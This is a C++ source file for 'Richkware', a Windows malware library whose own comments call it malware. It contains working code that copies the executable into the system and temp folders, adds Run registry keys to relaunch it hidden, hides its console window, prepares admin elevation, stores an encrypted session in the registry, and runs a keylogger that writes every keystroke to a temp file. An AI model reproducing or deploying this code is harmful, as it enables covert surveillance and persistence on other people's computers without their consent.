/*
 *      Copyright 2016 Riccardo Melioli. All Rights Reserved.
 */

#include "richkware.h"

void Richkware::SaveInfo(const char* key, const char* value) {
	LoadSession(encryptionKey);
	session.insert(std::pair<std::string, std::string>(key, value));
	SaveSession(encryptionKey);
}

std::string Richkware::FindInfo(const char * key) {
	LoadSession(encryptionKey);
	std::map<std::string, std::string>::iterator it = session.find(key);
	if (it != session.end())
		return it->second;
	else
		return "";
}

void Richkware::RemoveInfo(const char * key) {
	LoadSession(encryptionKey);
	session.erase(key);
	SaveSession(encryptionKey);
}

BOOL Richkware::IsAdmin() {
	BOOL fIsRunAsAdmin = FALSE;
	DWORD dwError = ERROR_SUCCESS;
	PSID pAdministratorsGroup = NULL;

	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	if (!AllocateAndInitializeSid(&NtAuthority, 2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
		dwError = GetLastError();

	}
	else if (!CheckTokenMembership(NULL, pAdministratorsGroup,
		&fIsRunAsAdmin)) {
		dwError = GetLastError();

	}

	if (pAdministratorsGroup) {
		FreeSid(pAdministratorsGroup);
		pAdministratorsGroup = NULL;
	}

	if (ERROR_SUCCESS != dwError) {
		throw dwError;
	}

	return fIsRunAsAdmin;
}

void Richkware::RequestAdminPrivileges() {
	BOOL bAlreadyRunningAsAdministrator = FALSE;
	try {
		bAlreadyRunningAsAdministrator = IsAdmin();
	}
	catch (...) {

	}
	if (!bAlreadyRunningAsAdministrator) {
		char szPath[MAX_PATH];
		if (GetModuleFileName(NULL, szPath, MAX_PATH)) {

			SHELLEXECUTEINFO sei = { sizeof(sei) };

			sei.lpVerb = "runas";
			sei.lpFile = szPath;
			sei.hwnd = NULL;
			sei.nShow = SW_NORMAL;

			/*if (!ShellExecuteEx(&sei)) {
			 DWORD dwError = GetLastError();
			 //if (dwError == ERROR_CANCELLED)
			 //CreateThread(0, 0, (LPTHREAD_START_ROUTINE) RequestAdminPrivileges, 0, 0, 0);
			 }*/
		}

	}
	else {
		///Code
	}
}

void Richkware::Persistance() {
	// copy value in system
	HMODULE module_handler = GetModuleHandle(NULL);
	char file_path[MAX_PATH];
	char system_path[MAX_PATH];
	char system_path_reg[MAX_PATH] = "\"";
	char tmp_path[MAX_PATH];
	char tmp_path_reg[MAX_PATH] = "\"";

	GetModuleFileName(module_handler, file_path, MAX_PATH);
	GetSystemDirectory(system_path, MAX_PATH);
	strcat(system_path_reg, system_path);
	GetTempPath(MAX_PATH, tmp_path);
	strcat(tmp_path_reg, tmp_path);

	strcat(system_path_reg, ("\\" + appName + ".exe\" /noshow").c_str());
	strcat(system_path, ("\\" + appName + ".exe").c_str());
	CopyFile(file_path, system_path, true);

	strcat(tmp_path_reg, (appName + ".exe\" /noshow").c_str());
	strcat(tmp_path, (appName + ".exe").c_str());
	CopyFile(file_path, tmp_path, true);

	SaveValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		(appName + "1").c_str(), system_path_reg);
	SaveValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		(appName + "2").c_str(), tmp_path_reg);

}

void Richkware::StealthWindow(const char* window) {
	HWND app_heandler = FindWindow(NULL, window);
	Sleep(1000);
	if (app_heandler != NULL)
		ShowWindow(app_heandler, false);
}

// OpenApp("notepad.exe");  "http:\\www.google.com"
void Richkware::OpenApp(const char* app) {
	ShellExecute(NULL, "open", app, NULL, NULL, SW_MAXIMIZE);
}


void Richkware::RandMouse() {
	// screen resolution
	RECT desktop;
	const HWND desktop_handler = GetDesktopWindow();
	GetWindowRect(desktop_handler, &desktop);
	long horizontal = desktop.right;
	long vertical = desktop.bottom;

	// move cursor
	SetCursorPos((rand() % horizontal + 1), (rand() % vertical + 1));
}

void Richkware::SaveSession(const char* encryptionKey) {
	std::string sessionString;

	for (std::map<std::string, std::string>::iterator it = session.begin();
		it != session.end(); ++it) {
		sessionString.append(it->first + "," + it->second + "|");
	}

	sessionString = EncryptDecrypt(sessionString, encryptionKey);

	SaveValueReg("Software\\Microsoft\\Windows", appName.c_str(),
		sessionString.c_str());
	SaveValueToFile(sessionString.c_str());

}

void Richkware::LoadSession(const char* encryptionKey) {
	std::string sessionString;
	sessionString = LoadValueReg("Software\\Microsoft\\Windows", appName.c_str());
	if (sessionString.empty()) {
		sessionString = LoadValueFromFile();
	}

	sessionString = EncryptDecrypt(sessionString, encryptionKey);

	session.clear();

	std::string key, tmp;

	for (std::string::iterator it = sessionString.begin();
		it != sessionString.end(); ++it) {

		if (*it == ',') { // end of key
			key = tmp;
			tmp = "";
		}
		else if (*it == '|') { // end of value
			// write key,value into map
			session.insert(std::pair<std::string, std::string>(key, tmp));;
			tmp = "";
		}
		else {
			tmp += *it;
		}

	}

}


void Richkware::SaveValueToFile(const char* value, const char * path) {
	std::string fileName = (appName + ".log").c_str();
	std::string filePath;

	// save in temp folder
	if (path == NULL) {
		char tmpPath[MAX_PATH];
		GetTempPath(MAX_PATH, tmpPath);
		filePath = tmpPath + fileName;

	}
	else {
		filePath = path + fileName;
	}

	std::ofstream file(filePath.c_str());
	std::string stringValue = value;

	if (file.is_open()) {
		for (std::string::iterator it = stringValue.begin();
			it != stringValue.end(); ++it) {
			file << *it;
		}
		file.close();
	}
}

std::string Richkware::LoadValueFromFile(const char* path) {
	std::string fileName = (appName + ".log").c_str();
	std::string filePath;

	// save in temp folder
	if (path == NULL) {
		char tmpPath[MAX_PATH];
		GetTempPath(MAX_PATH, tmpPath);
		filePath = tmpPath + fileName;

	}
	else {
		filePath = path + fileName;
	}

	std::ifstream file(filePath.c_str());
	std::string value;
	std::string tmp;

	if (file.is_open()) {
		while (!file.eof()) {
			getline(file, tmp);
			 value.push_back('\n');
			value.append(tmp);
		}
	}

	return value;

}

void Richkware::SaveValueReg(const char* path, const char* key,
	const char* value) {
	// set value in register
	HKEY hKey;
	HKEY hKey2;

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0,
		KEY_SET_VALUE, &hKey);

	RegOpenKey(HKEY_CURRENT_USER, path, &hKey2);

	if (hKey != NULL) {
		RegSetValueEx(hKey, key, 0, REG_SZ, (const unsigned char*)value,
			MAX_PATH);
	}
	if (hKey2 != NULL) {
		RegSetValueEx(hKey2, key, 0, REG_SZ, (const unsigned char*)value,
			MAX_PATH);
	}

	RegCloseKey(hKey);
	RegCloseKey(hKey2);
}

std::string Richkware::LoadValueReg(const char* path, const char* key) {
	std::string value = "";
	HKEY hKey;
	
	LONG lresult = RegOpenKey(HKEY_CURRENT_USER, path, &hKey);
	if (lresult != ERROR_SUCCESS) {
		if (hKey != NULL) {
			char szBuffer[512];
			DWORD dwBufferSize = sizeof(szBuffer);
			RegQueryValueEx(hKey, key, 0, NULL, (LPBYTE)szBuffer, &dwBufferSize);
			value.append(szBuffer);
		}
	}
	else {
		lresult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_SET_VALUE, &hKey);
		if (lresult != ERROR_SUCCESS) {
			if (hKey != NULL) {
				char szBuffer[512];
				DWORD dwBufferSize = sizeof(szBuffer);
				RegQueryValueEx(hKey, key, 0, NULL, (LPBYTE)szBuffer, &dwBufferSize);
				value.append(szBuffer);
			}
		}
	}


	RegCloseKey(hKey);
	return value;
}

void Richkware::Keylogger(const char* fileName) {
	HANDLE hBlockAppsTh = CreateThread(0, 0, &KeyloggerThread, (void*)fileName, 0, 0);

	if (hBlockAppsTh != NULL) {
		WaitForSingleObject(hBlockAppsTh, INFINITE);
		CloseHandle(hBlockAppsTh);
	}
}

void Richkware::Hibernation() {
	Sleep(1000);
	SendMessage(HWND_BROADCAST,
		WM_SYSCOMMAND,
		SC_MONITORPOWER, (LPARAM)2);
}


// verify the existence of malware session.
bool Richkware::CheckSession() {
	if (!(LoadValueReg("Software\\Microsoft\\Windows", appName.c_str()).empty()))
		return true;
	return false;
}

// verify the existence of malware values created by the persistence function.
bool Richkware::CheckPersistance() {
	bool b = false;
	HMODULE module_handler = GetModuleHandle(NULL);
	char system_path[MAX_PATH];
	char file_path[MAX_PATH];
	char tmp_path[MAX_PATH];

	GetModuleFileName(module_handler, file_path, MAX_PATH);
	GetSystemDirectory(system_path, MAX_PATH);
	GetTempPath(MAX_PATH, tmp_path);
	strcat(system_path, ("\\" + appName + ".exe").c_str());
	strcat(tmp_path, (appName + ".exe").c_str());
	std::ifstream fileSys(system_path);
	std::ifstream fileTmp(tmp_path);

	// ((persTmpREG && persTmpFILE) || (persTmpSYS && persTmpSYS))
	if ((!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", (appName + "1").c_str()).empty()) &&
		(fileSys.is_open())) ||
		(!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", (appName + "2").c_str()).empty()) &&
		(fileTmp.is_open()))) b = true;
/*
	if (!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", (appName + "1").c_str()).empty()))
		MessageBox(NULL, "TRUERegSys", " ", 0);

//	MessageBox(NULL, (LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", (appName + "1").c_str())).c_str()), " ", 0);

	if (fileSys.is_open())
		MessageBox(NULL, "TRUESYS", " ", 0);
		
	if(!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", (appName + "2").c_str()).empty()))
		MessageBox(NULL, "TRUETmpReg", " ", 0);

		
	if(fileTmp.is_open()) MessageBox(NULL, "TRUETMp", " ", 0);
*/

	fileSys.close();
	fileTmp.close();

	return b;
}


Richkware::Richkware(const char* AppNameArg, const char* EncryptionKeyArg) {
		appName = AppNameArg;
		system(("title " + appName).c_str());
		StealthWindow(appName.c_str());
		encryptionKey = EncryptionKeyArg;
		network = Network(EncryptionKeyArg);

		/*
		if (!(CheckSession()) && !(CheckPersistance())) {	// first run
		SaveInfo("FirstRun", "false");
		Persistance();
		}
		else if (!(CheckSession())) {	// N session, Y pers
		SaveInfo("FirstRun", "false");
		SaveInfo("RegCleaner", "true");
		}
		else if (!(CheckPersistance())) {	// Y session, N pers
		SaveInfo("TmpSysCleaner", "true");
		Persistance();
		}*/

		// metti check per ogni cosa registro o file in modo da sapere se ha qualcosa che controlla il registro o qualcosa che effettui pulizie o un antivirus

}

DWORD WINAPI KeyloggerThread(void* arg) {
	const char* nomeFile = (const char*)arg;
	char tmp_path[MAX_PATH];
	GetTempPath(MAX_PATH, tmp_path);
	std::string fileLog = tmp_path;
	fileLog.append(nomeFile);
	bool condSession = true;

	while (true) {
		std::ofstream file(fileLog.c_str(), std::ios::app);
		if (file.is_open()) {
			while (condSession) {
				for (int i = 0; i < 256; i++) {
					if (GetAsyncKeyState(i)) {
						file << (char)i;
						if (i == VK_RETURN || i == VK_LBUTTON) {
							condSession = false;
							break;
						}
					}
				}
				Sleep(100);
			}
		}
		file.close();
		condSession = true;
	}
}
